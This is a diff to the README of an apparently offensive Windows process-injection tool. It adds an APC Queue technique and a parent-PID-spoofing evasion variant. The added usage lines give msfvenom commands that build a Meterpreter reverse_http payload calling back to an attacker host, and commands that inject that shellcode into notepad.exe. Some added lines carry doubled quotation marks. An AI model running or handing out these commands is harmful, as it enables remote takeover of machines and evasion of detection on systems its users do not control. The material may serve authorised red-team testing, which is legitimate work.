@@ -3,13 +3,14 @@
 ----
 
 The program is designed to perform process injection.
-Currently the tool supports 3 process injection techniques.
+Currently the tool supports 4 process injection techniques.
 
 	1) Vanila Process Injection
 	2) DLL Injection
 	3) Process Hollowing
+	4) APC Queue
 
-Vanila Process Injection and Process Hollowing.
+Vanila Process Injection
 Currently the tool accepts shellcode in 3 formats.
 
 	1) base64
@@ -45,6 +46,11 @@ Supports 1 detection evading technique.
 	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
 	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /f:c /t:3
 	
+	[+] APC Queue
+	[+] Generating shellcode in c format and injecting it in the target process.
+	[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
+	[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:7
+
 	Detection Evading Technique
 
 	Parent PID Spoofing with Vanila Process Injection.
@@ -62,14 +68,24 @@ Supports 1 detection evading technique.
 	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
 	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /parentproc:explorer /f:c /t:6
 
+	[+] Parent PID Spoofing with APC Queue.
+	[+] Generating shellcode in c format and injecting it in the target process.
+	[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
+	[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /parentproc:explorer /f:c /t:8
 
 
 ### Blog Post
 
 [https://3xpl01tc0d3r.blogspot.com/2019/08/process-injection-part-i.html](https://3xpl01tc0d3r.blogspot.com/2019/08/process-injection-part-i.html)
+
 [https://3xpl01tc0d3r.blogspot.com/2019/09/process-injection-part-ii.html](https://3xpl01tc0d3r.blogspot.com/2019/09/process-injection-part-ii.html)
-[https://3xpl01tc0d3r.blogspot.com/2019/10/process-injection-part-iii.html](https://3xpl01tc0d3r.blogspot.com/2019/10/process-injection-part-iii.html)\
+
+[https://3xpl01tc0d3r.blogspot.com/2019/10/process-injection-part-iii.html](https://3xpl01tc0d3r.blogspot.com/2019/10/process-injection-part-iii.html)
+
 [https://medium.com/@r3n_hat/parent-pid-spoofing-b0b17317168e](https://medium.com/@r3n_hat/parent-pid-spoofing-b0b17317168e)
+
+[https://3xpl01tc0d3r.blogspot.com/2019/12/process-injection-part-v.html](https://3xpl01tc0d3r.blogspot.com/2019/12/process-injection-part-v.html)
+
 
 ### Contribution Credit
 
